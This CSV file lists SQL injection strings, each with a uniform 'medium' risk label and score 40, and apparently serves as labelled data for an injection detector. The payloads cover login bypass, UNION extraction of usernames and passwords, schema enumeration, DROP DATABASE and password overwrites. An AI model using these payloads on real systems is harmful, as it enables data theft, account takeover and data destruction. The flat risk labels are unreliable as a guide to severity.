query,risk,score
'; SELECT COUNT(*) FROM users -- -- a,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- n,medium,40
' OR username LIKE '%admin%' -- -- r,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 3,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
'; DROP DATABASE temp -- # k9,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- # i4,medium,40
'; UPDATE users SET password='pass' # of,medium,40
' HAVING 1=1 # -- 5,medium,40
'; SELECT @@version -- -- j,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- l",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- z,medium,40
'; SELECT COUNT(*) FROM users -- # tp,medium,40
'; UPDATE users SET password='pass' # rr,medium,40
1' OR '1' = '1' GROUP BY 1 -- # h9,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- x",medium,40
1' OR 1=1; SELECT * FROM users -- -- f,medium,40
'; SELECT @@version -- -- m,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- q",medium,40
' OR username LIKE '%admin%' -- -- 9,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- b",medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 9",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- # 71,medium,40
"' UNION SELECT username, password FROM users -- # ti",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # on",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # u3",medium,40
'; UPDATE users SET password='pass' -- w,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- # 59,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
' HAVING 1=1 # /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # px",medium,40
'; DROP DATABASE temp -- # v4,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
' OR username LIKE '%admin%' -- -- z,medium,40
' HAVING 1=1 # # 9s,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
' HAVING 1=1 # /**/,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
"' UNION SELECT username, password FROM users -- -- g",medium,40
' UNION SELECT * FROM information_schema.tables -- -- y,medium,40
' or 1=1 in (select * from users) -- -- 2,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' HAVING 1=1 # # xd,medium,40
1' OR 1=1; SELECT * FROM users -- # t3,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' or 1=1 in (select * from users) -- # xi,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 5,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- -- h,medium,40
"' UNION SELECT username, password FROM users -- # u1",medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- y,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' UNION SELECT username, password FROM users -- -- 6",medium,40
' or 1=1 in (select * from users) -- # c3,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; UPDATE users SET password='pass' /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- s,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # k7",medium,40
'; UPDATE users SET password='pass' -- 8,medium,40
'; SELECT @@version -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- -- 4,medium,40
'; SELECT COUNT(*) FROM users -- -- v,medium,40
'; DROP DATABASE temp -- # 4r,medium,40
' HAVING 1=1 # # be,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # nf",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
' HAVING 1=1 # -- 8,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- -- f,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
'; DROP DATABASE temp -- -- 5,medium,40
1' OR '1' = '1' GROUP BY 1 -- # gy,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- 6,medium,40
' UNION SELECT * FROM information_schema.tables -- -- x,medium,40
' HAVING 1=1 # # r2,medium,40
'; SELECT @@version -- -- x,medium,40
'; UPDATE users SET password='pass' -- h,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- # mf,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # tw",medium,40
' UNION SELECT * FROM information_schema.tables -- -- c,medium,40
'; UPDATE users SET password='pass' # 9r,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- w",medium,40
1' OR 1=1; SELECT * FROM users -- -- 4,medium,40
'; SELECT COUNT(*) FROM users -- -- t,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # un",medium,40
' HAVING 1=1 # # mp,medium,40
'; DROP DATABASE temp -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # n6",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- m",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 1",medium,40
'; DROP DATABASE temp -- # ye,medium,40
1' OR 1=1; SELECT * FROM users -- -- j,medium,40
"' UNION SELECT username, password FROM users -- # 46",medium,40
' HAVING 1=1 # -- z,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- b",medium,40
' or 1=1 in (select * from users) -- -- i,medium,40
'; UPDATE users SET password='pass' -- 5,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 4,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- h",medium,40
' OR username LIKE '%admin%' -- -- m,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- -- v,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- # v7,medium,40
' or 1=1 in (select * from users) -- # pu,medium,40
'; SELECT @@version -- -- 4,medium,40
'; SELECT @@version -- # gb,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
'; SELECT @@version -- -- e,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- z",medium,40
' or 1 = 1 LIMIT 1 -- # h9,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- m",medium,40
'; UPDATE users SET password='pass' -- 2,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 4t,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' OR username LIKE '%admin%' -- # 87,medium,40
' OR username LIKE '%admin%' -- -- 2,medium,40
'; DROP DATABASE temp -- # if,medium,40
'; SELECT COUNT(*) FROM users -- # jw,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
"' UNION SELECT username, password FROM users -- # dv",medium,40
1' OR '1' = '1' GROUP BY 1 -- # u0,medium,40
'; DROP DATABASE temp -- -- n,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 2,medium,40
' HAVING 1=1 # /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
'; UPDATE users SET password='pass' # rw,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # ie,medium,40
'; SELECT @@version -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- -- w,medium,40
1' OR 1=1; SELECT * FROM users -- # 0j,medium,40
1' OR 1=1; SELECT * FROM users -- -- g,medium,40
' OR username LIKE '%admin%' -- -- 0,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
'; UPDATE users SET password='pass' # 02,medium,40
1' OR 1=1; SELECT * FROM users -- -- g,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
'; DROP DATABASE temp -- -- k,medium,40
'; UPDATE users SET password='pass' -- 8,medium,40
'; SELECT @@version -- # h9,medium,40
' or 1=1 in (select * from users) -- # nc,medium,40
'; SELECT @@version -- -- 0,medium,40
"' UNION SELECT username, password FROM users -- # 42",medium,40
' or 1=1 in (select * from users) -- -- 2,medium,40
' HAVING 1=1 # # mh,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 2",medium,40
1' OR '1' = '1' GROUP BY 1 -- # 3w,medium,40
' HAVING 1=1 # -- 6,medium,40
"' UNION SELECT username, password FROM users -- -- k",medium,40
"' UNION SELECT username, password FROM users -- -- 7",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
"' UNION SELECT username, password FROM users -- -- 2",medium,40
'; DROP DATABASE temp -- # e1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- # nm,medium,40
'; SELECT @@version -- # 70,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 45",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' UNION SELECT username, password FROM users -- -- t",medium,40
' HAVING 1=1 # -- j,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 4,medium,40
'; SELECT @@version -- -- x,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
'; SELECT @@version -- -- s,medium,40
'; DROP DATABASE temp -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- # nk,medium,40
1' OR 1=1; SELECT * FROM users -- # u4,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; SELECT @@version -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
'; DROP DATABASE temp -- -- i,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- r",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 8m",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- # ln,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 1",medium,40
' UNION SELECT * FROM information_schema.tables -- -- t,medium,40
' HAVING 1=1 # -- t,medium,40
'; UPDATE users SET password='pass' -- a,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 1",medium,40
'; UPDATE users SET password='pass' /**/,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; SELECT @@version -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- -- t,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
'; SELECT @@version -- /**/,medium,40
"' UNION SELECT username, password FROM users -- # nx",medium,40
' OR username LIKE '%admin%' -- -- g,medium,40
' or 1 = 1 LIMIT 1 -- -- c,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # qy",medium,40
'; SELECT COUNT(*) FROM users -- -- 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
'; DROP DATABASE temp -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 2",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- t",medium,40
'; SELECT COUNT(*) FROM users -- # i6,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' HAVING 1=1 # /**/,medium,40
'; DROP DATABASE temp -- -- 1,medium,40
'; SELECT COUNT(*) FROM users -- # 9b,medium,40
1' OR 1=1; SELECT * FROM users -- -- f,medium,40
' or 1=1 in (select * from users) -- # 6z,medium,40
' or 1 = 1 LIMIT 1 -- -- 2,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- r,medium,40
' or 1 = 1 LIMIT 1 -- -- l,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- l",medium,40
' OR username LIKE '%admin%' -- -- l,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- j",medium,40
' or 1 = 1 LIMIT 1 -- # mx,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- # c0,medium,40
' HAVING 1=1 # # rv,medium,40
'; SELECT @@version -- -- x,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' or 1=1 in (select * from users) -- -- 1,medium,40
' or 1=1 in (select * from users) -- # 4o,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- u",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- o,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 4",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 6",medium,40
"' UNION SELECT username, password FROM users -- # mv",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; SELECT @@version -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- # gz,medium,40
1' OR '1' = '1' GROUP BY 1 -- # t0,medium,40
'; SELECT COUNT(*) FROM users -- # xp,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- x",medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- r",medium,40
' or 1=1 in (select * from users) -- # 05,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- 1,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' OR username LIKE '%admin%' -- -- 0,medium,40
'; SELECT COUNT(*) FROM users -- -- i,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 9,medium,40
'; SELECT COUNT(*) FROM users -- -- o,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- y",medium,40
' OR username LIKE '%admin%' -- -- f,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- # 6x,medium,40
'; UPDATE users SET password='pass' -- o,medium,40
' UNION SELECT * FROM information_schema.tables -- # 1b,medium,40
'; DROP DATABASE temp -- # kh,medium,40
'; DROP DATABASE temp -- # 2x,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 0h",medium,40
'; UPDATE users SET password='pass' # tu,medium,40
'; SELECT @@version -- # yz,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
'; SELECT @@version -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # h9",medium,40
1' OR '1' = '1' GROUP BY 1 -- # bj,medium,40
' HAVING 1=1 # -- f,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # u2",medium,40
'; UPDATE users SET password='pass' # au,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 3",medium,40
'; SELECT COUNT(*) FROM users -- # 3w,medium,40
' or 1 = 1 LIMIT 1 -- -- 5,medium,40
'; SELECT COUNT(*) FROM users -- # oh,medium,40
' HAVING 1=1 # -- h,medium,40
'; SELECT @@version -- -- n,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- d,medium,40
' or 1=1 in (select * from users) -- # 9z,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- s,medium,40
' OR username LIKE '%admin%' -- # uv,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- s",medium,40
' or 1=1 in (select * from users) -- # fp,medium,40
'; DROP DATABASE temp -- # b1,medium,40
'; DROP DATABASE temp -- # ir,medium,40
"' UNION SELECT username, password FROM users -- # we",medium,40
' HAVING 1=1 # -- u,medium,40
' UNION SELECT * FROM information_schema.tables -- -- h,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 3,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; UPDATE users SET password='pass' -- f,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' or 1=1 in (select * from users) -- # bd,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' HAVING 1=1 # # gz,medium,40
' OR username LIKE '%admin%' -- -- j,medium,40
1' OR '1' = '1' GROUP BY 1 -- # dy,medium,40
1' OR 1=1; SELECT * FROM users -- # 5w,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- b",medium,40
"' UNION SELECT username, password FROM users -- -- b",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' or 1=1 in (select * from users) -- # ts,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' UNION SELECT username, password FROM users -- -- v",medium,40
'; DROP DATABASE temp -- # f1,medium,40
' or 1=1 in (select * from users) -- # 9m,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 1",medium,40
' HAVING 1=1 # -- c,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- j,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # zs",medium,40
'; DROP DATABASE temp -- # vj,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
'; SELECT @@version -- /**/,medium,40
"' UNION SELECT username, password FROM users -- # ho",medium,40
'; SELECT @@version -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- -- k,medium,40
' or 1=1 in (select * from users) -- -- c,medium,40
1' OR 1=1; SELECT * FROM users -- -- t,medium,40
"' UNION SELECT username, password FROM users -- # ym",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- m",medium,40
'; UPDATE users SET password='pass' /**/,medium,40
' HAVING 1=1 # -- g,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' UNION SELECT username, password FROM users -- # nd",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- w",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 2o",medium,40
' UNION SELECT * FROM information_schema.tables -- # zx,medium,40
"' UNION SELECT username, password FROM users -- # 81",medium,40
'; SELECT COUNT(*) FROM users -- -- m,medium,40
' UNION SELECT * FROM information_schema.tables -- -- l,medium,40
'; SELECT @@version -- # y3,medium,40
'; DROP DATABASE temp -- # q3,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # p5",medium,40
'; UPDATE users SET password='pass' -- 5,medium,40
'; SELECT COUNT(*) FROM users -- -- y,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
' OR username LIKE '%admin%' -- # 78,medium,40
1' OR 1=1; SELECT * FROM users -- -- v,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # ag",medium,40
' or 1=1 in (select * from users) -- -- 2,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- l,medium,40
'; DROP DATABASE temp -- # h9,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- l,medium,40
' HAVING 1=1 # -- w,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # i6",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- # 3h,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
' HAVING 1=1 # # h7,medium,40
'; DROP DATABASE temp -- -- t,medium,40
'; UPDATE users SET password='pass' -- o,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- t",medium,40
1' OR '1' = '1' GROUP BY 1 -- # tb,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 1",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
' OR username LIKE '%admin%' -- # ju,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- z",medium,40
1' OR 1=1; SELECT * FROM users -- -- 1,medium,40
'; SELECT @@version -- /**/,medium,40
"' UNION SELECT username, password FROM users -- -- c",medium,40
'; UPDATE users SET password='pass' # y4,medium,40
'; SELECT COUNT(*) FROM users -- # xh,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- 9,medium,40
' OR username LIKE '%admin%' -- # 7p,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 1",medium,40
'; SELECT COUNT(*) FROM users -- -- 7,medium,40
'; UPDATE users SET password='pass' -- r,medium,40
1' OR 1=1; SELECT * FROM users -- # jm,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
'; SELECT @@version -- # 7z,medium,40
' or 1=1 in (select * from users) -- -- h,medium,40
'; UPDATE users SET password='pass' -- 7,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 7,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 3t,medium,40
'; UPDATE users SET password='pass' -- g,medium,40
'; DROP DATABASE temp -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # k2",medium,40
1' OR '1' = '1' GROUP BY 1 -- # wj,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 8,medium,40
' or 1=1 in (select * from users) -- # tn,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # qg,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' UNION SELECT username, password FROM users -- # vg",medium,40
' HAVING 1=1 # /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- 6,medium,40
'; UPDATE users SET password='pass' # li,medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; DROP DATABASE temp -- -- e,medium,40
'; SELECT @@version -- /**/,medium,40
'; DROP DATABASE temp -- -- 6,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
'; UPDATE users SET password='pass' -- 4,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # se",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # a3,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' HAVING 1=1 # -- 3,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 1",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- k,medium,40
'; SELECT @@version -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- g",medium,40
'; SELECT COUNT(*) FROM users -- -- a,medium,40
'; SELECT @@version -- /**/,medium,40
"' UNION SELECT username, password FROM users -- -- y",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
"' UNION SELECT username, password FROM users -- -- 1",medium,40
' OR username LIKE '%admin%' -- -- z,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- u",medium,40
' OR username LIKE '%admin%' -- -- o,medium,40
'; UPDATE users SET password='pass' # k8,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' HAVING 1=1 # # 22,medium,40
'; SELECT COUNT(*) FROM users -- # sd,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- x",medium,40
' HAVING 1=1 # # 6w,medium,40
' OR username LIKE '%admin%' -- -- q,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- s,medium,40
'; DROP DATABASE temp -- # 6c,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; SELECT @@version -- # 49,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # so",medium,40
'; SELECT @@version -- /**/,medium,40
'; UPDATE users SET password='pass' # 8t,medium,40
' HAVING 1=1 # -- a,medium,40
'; SELECT @@version -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- # s5,medium,40
'; DROP DATABASE temp -- # fv,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 3f",medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' or 1=1 in (select * from users) -- -- 8,medium,40
' UNION SELECT * FROM information_schema.tables -- -- g,medium,40
"' UNION SELECT username, password FROM users -- -- h",medium,40
1' OR 1=1; SELECT * FROM users -- # 5t,medium,40
' HAVING 1=1 # -- l,medium,40
' UNION SELECT * FROM information_schema.tables -- -- a,medium,40
' UNION SELECT * FROM information_schema.tables -- # 8d,medium,40
' or 1 = 1 LIMIT 1 -- -- w,medium,40
'; DROP DATABASE temp -- # 04,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
' HAVING 1=1 # /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 5",medium,40
' UNION SELECT * FROM information_schema.tables -- # ng,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' OR username LIKE '%admin%' -- # 7g,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
' HAVING 1=1 # /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 7",medium,40
'; SELECT COUNT(*) FROM users -- # 3k,medium,40
' HAVING 1=1 # # ds,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- e",medium,40
'; UPDATE users SET password='pass' # f3,medium,40
